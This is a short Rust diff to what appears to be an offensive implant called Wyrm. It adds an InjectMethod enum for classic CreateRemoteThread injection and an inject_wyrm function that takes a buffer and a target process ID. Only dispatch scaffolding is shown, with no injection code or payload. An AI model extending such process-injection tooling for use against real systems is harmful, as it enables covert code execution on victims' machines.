@@ -1,21 +1,29 @@
 //! A module for loading / injecting Wyrm into other / new processes.
 
-use std::{
-    fs::{self},
-    path::PathBuf,
-};
-
 use shared::tasks::WyrmResult;
 
-use crate::{
-    native::filesystem::{PathParseType, parse_path},
-    spawn_inject::early_cascade::early_cascade_spawn_child,
-};
+use crate::spawn_inject::{early_cascade::early_cascade_spawn_child, injection::virgin_inject};
 
 pub mod early_cascade;
+mod injection;
 
 pub enum SpawnMethod {
     EarlyCascade,
+}
+
+pub enum InjectMethod {
+    /// Classic CreateRemoteThread...
+    Virgin,
+}
+
+pub struct Inject;
+
+impl Inject {
+    pub fn inject_wyrm(buf: &[u8], method: InjectMethod, pid: u32) -> WyrmResult<String> {
+        match method {
+            InjectMethod::Virgin => virgin_inject(buf, pid),
+        }
+    }
 }
 
 pub struct Spawn;
